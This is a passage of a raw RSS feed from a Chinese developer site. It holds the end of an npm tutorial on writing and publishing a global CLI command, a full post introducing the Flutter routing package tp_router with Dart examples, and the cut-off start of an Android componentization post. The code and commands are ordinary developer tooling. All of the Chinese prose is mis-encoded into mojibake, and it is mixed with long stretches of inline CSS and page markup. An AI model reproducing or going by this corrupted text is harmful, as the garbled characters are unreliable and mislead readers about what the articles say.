<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> my-cli &amp;&amp; <span class="hljs-built_in">cd</span> my-cli
npm init -y
</code></pre>
<h3 data-id="heading-7">2. åˆ›å»ºæ ¸å¿ƒä»£ç  <code>index.js</code></h3>
<p>æ–‡ä»¶é¡¶éƒ¨å¿…é¡»åŠ ä¸Š Shebangï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-meta">#!/usr/bin/env node</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"ä½ å¥½ï¼è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ªå…¨å±€å‘½ä»¤ï¼"</span>);

<span class="hljs-comment">// è·å–ç”¨æˆ·è¾“å…¥çš„å‚æ•°</span>
<span class="hljs-keyword">const</span> args = process.<span class="hljs-property">argv</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>);
<span class="hljs-keyword">if</span> (args.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä½ è¾“å…¥çš„å‚æ•°æ˜¯: <span class="hljs-subst">${args.join(<span class="hljs-string">', '</span>)}</span>`</span>);
}
</code></pre>
<h3 data-id="heading-8">3. é…ç½® <code>package.json</code></h3>
<p>æ·»åŠ  <code>bin</code> å­—æ®µï¼Œå»ºç«‹â€œå‘½ä»¤åâ€åˆ°â€œè„šæœ¬æ–‡ä»¶â€çš„æ˜ å°„ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"hi-cli"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"bin"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"hi-cli"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./index.js"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-9">4. æœ¬åœ°æ¨¡æ‹Ÿå®‰è£…</h3>
<p>åœ¨å½“å‰ç›®å½•ä¸‹è¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm <span class="hljs-built_in">link</span>
</code></pre>
<p>ç°åœ¨ï¼Œä½ å¯ä»¥åœ¨ç”µè„‘ä»»ä½•åœ°æ–¹è¾“å…¥ <code>hi-cli hello</code> çœ‹çœ‹æ•ˆæœäº†ï¼</p>
<hr/>
<h2 data-id="heading-10">å››ã€ è¿›é˜¶ï¼šnpm å®ƒæ˜¯å¦‚ä½•æ‰¾åˆ°ä»£ç å¹¶ä¸‹è½½çš„ï¼Ÿ</h2>
<p>å½“ä½ æ‰§è¡Œå®‰è£…å‘½ä»¤æ—¶ï¼Œnpm ç»å†äº†ä»¥ä¸‹æµç¨‹ï¼š</p>
<ol>
<li><strong>ç¡®å®šæºï¼ˆRegistryï¼‰</strong>ï¼šæ£€æŸ¥æ˜¯å» npm å®˜æ–¹æºï¼ˆregistry.npmjs.orgï¼‰è¿˜æ˜¯æ·˜å®é•œåƒæºã€‚</li>
<li><strong>è·å–å…ƒæ•°æ®</strong>ï¼šè¯·æ±‚æœåŠ¡å™¨è·å–åŒ…çš„ JSON ä¿¡æ¯ï¼ˆåŒ…å«æ‰€æœ‰ç‰ˆæœ¬å·ã€ä¸‹è½½åœ°å€ã€å“ˆå¸Œå€¼ï¼‰ã€‚</li>
<li><strong>ä¸‹è½½å‹ç¼©åŒ…</strong>ï¼šæ ¹æ®ç‰ˆæœ¬è¦æ±‚æ‰¾åˆ° <code>.tar.gz</code> åœ°å€ï¼Œä¸‹è½½åˆ°æœ¬åœ°ç¼“å­˜ã€‚</li>
<li><strong>æ ¡éªŒä¸è§£å‹</strong>ï¼šé€šè¿‡å“ˆå¸Œå€¼æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å®Œæ•´ï¼Œç„¶åè§£å‹åˆ°å…¨å±€ <code>node_modules</code>ã€‚</li>
<li><strong>ç”Ÿæˆè½¯é“¾</strong>ï¼šæ ¹æ® <code>package.json</code> é‡Œçš„ <code>bin</code> é…ç½®ï¼Œåœ¨ç³»ç»Ÿ PATH ä¸‹ç”Ÿæˆå¯æ‰§è¡Œçš„å¿«æ·æ–¹å¼ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-11">äº”ã€ æˆæœåˆ†äº«ï¼šå¦‚ä½•å‘å¸ƒä½ çš„å‘½ä»¤åˆ° npmï¼Ÿ</h2>
<p>æƒ³è®©å…¨ä¸–ç•Œçš„äººéƒ½ç”¨ä½ çš„ <code>hi-cli</code>ï¼Ÿåªéœ€ç®€å•å‡ æ­¥ï¼š</p>
<h3 data-id="heading-12">1. æ³¨å†Œä¸éªŒè¯</h3>
<ul>
<li>åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2F" target="_blank" title="https://www.npmjs.com/" ref="nofollow noopener noreferrer">npmjs.com</a> æ³¨å†Œè´¦å·ã€‚</li>
<li><strong>å¿…é¡»</strong>å»é‚®ç®±å®ŒæˆéªŒè¯ï¼ˆå¦åˆ™å‘å¸ƒä¼šæŠ¥ 403 é”™è¯¯ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-13">2. ç™»å½•ä¸å‘å¸ƒ</h3>
<ol>
<li><strong>åˆ‡æ¢åˆ°å®˜æ–¹æº</strong>ï¼ˆå¦‚æœæ˜¯æ·˜å®æºæ— æ³•å‘å¸ƒï¼‰ï¼š
<code>npm config set registry https://registry.npmjs.org/</code></li>
<li><strong>ç™»å½•</strong>ï¼š
<code>npm login</code></li>
<li><strong>å‘å¸ƒ</strong>ï¼š
<code>npm publish</code>
<em>(å¦‚æœæ˜¯ä½œç”¨åŸŸåŒ…å¦‚ @me/hi-cliï¼Œéœ€ä½¿ç”¨ <code>npm publish --access public</code>)</em></li>
</ol>
<h3 data-id="heading-14">3. å…³äºæ·˜å®é•œåƒ</h3>
<p>ä½ ä¸éœ€è¦æ‰‹åŠ¨ä¸Šä¼ åˆ°æ·˜å®é•œåƒã€‚å®˜æ–¹ npm å‘å¸ƒåï¼Œæ·˜å®é•œåƒé€šå¸¸ä¼šåœ¨å‡ åˆ†é’Ÿå†…è‡ªåŠ¨åŒæ­¥ã€‚å¦‚æœæ²¡æœ‰åŒæ­¥ï¼Œå¯ä»¥å» <a href="https://link.juejin.cn?target=https%3A%2F%2Fnpmmirror.com%2F" target="_blank" title="https://npmmirror.com/" ref="nofollow noopener noreferrer">npmmirror.com</a> æ‰‹åŠ¨ç‚¹å‡» <strong>Sync</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-15">å…­ã€ æ€»ç»“</h2>
<ol>
<li><strong>å‘½ä»¤çš„æœ¬è´¨</strong>ï¼šæ˜¯ä¸€ä¸ªåœ¨ <code>package.json</code> ä¸­é…ç½®äº†åå­—ã€å¹¶è¢«æ”¾åœ¨ç³»ç»Ÿç¯å¢ƒå˜é‡è·¯å¾„ä¸‹çš„æ™®é€šè„šæœ¬æ–‡ä»¶ã€‚</li>
<li><strong>å…¨å±€å®‰è£…çš„æ„ä¹‰</strong>ï¼šåœ¨äºå»ºç«‹ç³»ç»Ÿçº§å¿«æ·æ–¹å¼ã€‚</li>
<li><strong>å¼€å‘è€…çš„åŠ›é‡</strong>ï¼šé€šè¿‡ npm æ³¨å†Œè¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ä¸€é”®è·å–å¹¶å¤ç”¨å…¨ä¸–ç•Œå¼€å‘è€…çš„æ™ºæ…§ã€‚</li>
</ol>
<hr/>
<p><em>å¸Œæœ›è¿™ä»½ç¬”è®°å¯¹ä½ æœ‰å¸®åŠ©ï¼å¦‚æœä½ è§‰å¾—æœ‰ç”¨ï¼Œæ¬¢è¿ç‚¹èµæ”¶è—ï¼</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[tp_router: å†ä¹Ÿä¸ç”¨æ‰‹åŠ¨å†™è·¯ç”±è¡¨äº†]]></title>    <link>https://juejin.cn/post/7592276645361811456</link>    <guid>https://juejin.cn/post/7592276645361811456</guid>    <pubDate>2026-01-07T11:55:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592276645361811456" data-draft-id="7592431064976572431" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="tp_router: å†ä¹Ÿä¸ç”¨æ‰‹åŠ¨å†™è·¯ç”±è¡¨äº†"/> <meta itemprop="keywords" content="Flutter"/> <meta itemprop="datePublished" content="2026-01-07T11:55:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœªæ¥çŒ«å’ªèŠ±"/> <meta itemprop="url" content="https://juejin.cn/user/1081575169340526"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            tp_router: å†ä¹Ÿä¸ç”¨æ‰‹åŠ¨å†™è·¯ç”±è¡¨äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1081575169340526/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœªæ¥çŒ«å’ªèŠ±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T11:55:15.000Z" title="Wed Jan 07 2026 11:55:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç”¨è¿‡ <code>go_router</code> å’Œ <code>auto_router</code> çš„éƒ½çŸ¥é“ï¼Œè·¯ç”±è¡¨è¿˜æ˜¯è¦è‡ªå·±æ‰‹å†™ã€‚</p>
<p>é¡µé¢ä¸€å¤šï¼Œç»´æŠ¤èµ·æ¥æ˜¯çœŸçš„çƒ¦ã€‚æ”¹ä¸ªè·¯å¾„è¦æ”¹å¥½å‡ ä¸ªåœ°æ–¹ï¼Œå‚æ•°ä¼ é€’è¿˜å®¹æ˜“å‡ºé”™ã€‚</p>
<p><strong>TpRouter å°±æ˜¯å¹²è¿™ä¸ªçš„ï¼šåŠ ä¸ªæ³¨è§£ï¼Œè·¯ç”±è¡¨è‡ªåŠ¨ç”Ÿæˆï¼Œå‚æ•°ç±»å‹å®‰å…¨ã€‚</strong></p>
<blockquote>
<p>tp = teleportï¼ˆä¼ é€ï¼‰ï¼Œå°±åƒ LOL é‡Œçš„ä¼ é€æŠ€èƒ½ï¼Œä¸€é”®åˆ°è¾¾ç›®çš„åœ°ã€‚</p>
</blockquote>
<h2 data-id="heading-0">çœ‹ä»£ç </h2>
<h3 data-id="heading-1">ä»¥å‰æ€ä¹ˆå†™</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// å®šä¹‰è·¯ç”±è¡¨</span>
<span class="hljs-keyword">final</span> routes = {
  <span class="hljs-string">'/user'</span>: (context) =&gt; UserPage(
    id: <span class="hljs-built_in">int</span>.parse(ModalRoute.of(context)!.settings.arguments <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>),
  ),
};

<span class="hljs-comment">// è·³è½¬</span>
Navigator.pushNamed(context, <span class="hljs-string">'/user'</span>, arguments: <span class="hljs-string">'42'</span>);
</code></pre>
<p>å‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œç±»å‹ä¸å®‰å…¨ï¼Œè¿è¡Œæ—¶æ‰çŸ¥é“é”™äº†ã€‚</p>
<h3 data-id="heading-2">ç°åœ¨æ€ä¹ˆå†™</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// åŠ ä¸ªæ³¨è§£ï¼Œæ„é€ å‡½æ•°å‚æ•°è‡ªåŠ¨è¯†åˆ«</span>
<span class="hljs-meta">@TpRoute</span>(path: <span class="hljs-string">'/user/:id'</span>)
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> id;  <span class="hljs-comment">// è‡ªåŠ¨ä»è·¯å¾„è§£æ</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> section;
  
  <span class="hljs-keyword">const</span> UserPage({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.id,
    <span class="hljs-keyword">this</span>.section = <span class="hljs-string">'profile'</span>,
    <span class="hljs-keyword">super</span>.key,
  });
}

<span class="hljs-comment">// æ³¨è§£ä¼šç”Ÿæˆ UserRoute å¯¹è±¡</span>
<span class="hljs-comment">// è·³è½¬å°±æ˜¯è°ƒç”¨ .tp()</span>
UserRoute(id: <span class="hljs-number">42</span>, section: <span class="hljs-string">'posts'</span>).tp(context);
</code></pre>
<p>è¿è¡Œ <code>dart run build_runner build</code>ï¼Œè·¯ç”±è¡¨è‡ªåŠ¨ç”Ÿæˆã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b58dddf381614afcb52365b4b8e142ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyq5p2l54yr5ZKq6Iqx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768392532&amp;x-signature=R00OPi62Lf%2FZLTWsfRJf6UJLC5s%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">æ ¸å¿ƒåŠŸèƒ½</h2>
<p><strong>æ³¨è§£é©±åŠ¨</strong> - åœ¨é¡µé¢ç±»ä¸ŠåŠ  <code>@TpRoute</code>ï¼Œè·¯ç”±è¡¨è‡ªåŠ¨ç”Ÿæˆ<br/>
<strong>ç±»å‹å®‰å…¨</strong> - æ„é€ å‡½æ•°å‚æ•°è‡ªåŠ¨æ˜ å°„ï¼Œç¼–è¯‘æ—¶æ£€æŸ¥ç±»å‹<br/>
<strong>API ç®€å•</strong> - <code>.tp(context)</code> ä¸€é”®ä¼ é€</p>
<h2 data-id="heading-4">å¯¹æ¯” auto_route</h2>
<p>auto_route ä¹Ÿç”¨æ³¨è§£ï¼Œä½†è¿˜æ˜¯è¦æ‰‹å†™è·¯ç”±è¡¨ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-meta">@AutoRoute</span>()
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{ ... }

<span class="hljs-comment">// è¿˜è¦åœ¨ @AutoRouterConfig é‡Œæ‰‹åŠ¨é…ç½®</span>
<span class="hljs-meta">@AutoRouterConfig</span>(routes: [
  AutoRoute(page: UserRoute.page, path: <span class="hljs-string">'/user/:id'</span>),
  AutoRoute(page: HomeRoute.page, path: <span class="hljs-string">'/'</span>),
  <span class="hljs-comment">// é¡µé¢ä¸€å¤šï¼Œè¿™é‡Œå°±å¾ˆé•¿...</span>
])
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppRouter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">RootStackRouter</span> </span>{}
</code></pre>
<p><strong>TpRouter ä¸ç”¨ã€‚</strong> åŠ å®Œæ³¨è§£ç›´æ¥ buildï¼Œè·¯ç”±è¡¨å…¨è‡ªåŠ¨ç”Ÿæˆï¼Œé›¶é…ç½®ã€‚</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-meta">@TpRoute</span>(path: <span class="hljs-string">'/user/:id'</span>)  <span class="hljs-comment">// è·¯å¾„å†™åœ¨è¿™é‡Œ</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{ ... }

<span class="hljs-comment">// main.dart åªéœ€è¦</span>
<span class="hljs-keyword">final</span> router = TpRouter(routes: tpRoutes);  <span class="hljs-comment">// è‡ªåŠ¨ç”Ÿæˆçš„åˆ—è¡¨</span>
</code></pre>
<p>é¡µé¢è¶Šå¤šï¼Œä¼˜åŠ¿è¶Šæ˜æ˜¾ã€‚</p>
<h2 data-id="heading-5">å…¶ä»–åŠŸèƒ½</h2>
<p><strong>é‡å®šå‘å®ˆå«</strong></p>
<pre><code class="hljs language-dart" lang="dart">FutureOr&lt;TpRouteBase?&gt; checkAuth(BuildContext context, ProtectedRoute route) {
  <span class="hljs-keyword">if</span> (!AuthService.isLoggedIn) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> LoginRoute();
  }
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
}

<span class="hljs-meta">@TpRoute</span>(path: <span class="hljs-string">'/protected'</span>, redirect: checkAuth)
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProtectedPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{ ... }
</code></pre>
<p><strong>Shell è·¯ç”±ï¼ˆåº•éƒ¨å¯¼èˆªæ ï¼‰</strong></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-meta">@TpShellRoute</span>(navigatorKey: <span class="hljs-string">'main'</span>, isIndexedStack: <span class="hljs-keyword">true</span>)
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{ ... }

<span class="hljs-meta">@TpRoute</span>(path: <span class="hljs-string">'/'</span>, parentNavigatorKey: <span class="hljs-string">'main'</span>, branchIndex: <span class="hljs-number">0</span>)
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HomePage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{ ... }
</code></pre>
<h2 data-id="heading-6">å®‰è£…</h2>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">tp_router:</span> <span class="hljs-string">^0.1.0</span>
  <span class="hljs-attr">tp_router_annotation:</span> <span class="hljs-string">^0.1.0</span>

<span class="hljs-attr">dev_dependencies:</span>
  <span class="hljs-attr">build_runner:</span> <span class="hljs-string">^2.4.0</span>
  <span class="hljs-attr">tp_router_generator:</span> <span class="hljs-string">^0.1.0</span>
</code></pre>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">void</span> main() {
  <span class="hljs-keyword">final</span> router = TpRouter(routes: tpRoutes);
  runApp(MaterialApp.router(routerConfig: router.routerConfig));
}
</code></pre>
<h2 data-id="heading-7">é“¾æ¥</h2>
<ul>
<li>GitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flwj1994%2Ftp_router" target="_blank" title="https://github.com/lwj1994/tp_router" ref="nofollow noopener noreferrer">github.com/lwj1994/tp_â€¦</a></li>
<li>pub.dev: <a href="https://link.juejin.cn?target=https%3A%2F%2Fpub.dev%2Fpackages%2Ftp_router" target="_blank" title="https://pub.dev/packages/tp_router" ref="nofollow noopener noreferrer">pub.dev/packages/tpâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç»„ä»¶åŒ–]]></title>    <link>https://juejin.cn/post/7592276645361893376</link>    <guid>https://juejin.cn/post/7592276645361893376</guid>    <pubDate>2026-01-07T12:33:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592276645361893376" data-draft-id="7592089325912408064" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç»„ä»¶åŒ–"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-07T12:33:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XRay"/> <meta itemprop="url" content="https://juejin.cn/user/3966693685869288"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç»„ä»¶åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3966693685869288/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XRay
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T12:33:50.000Z" title="Wed Jan 07 2026 12:33:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body .octicon{display:inline-block;fill:currentColor;vertical-align:text-bottom}.markdown-body .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown-body .anchor:focus{outline:none}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor 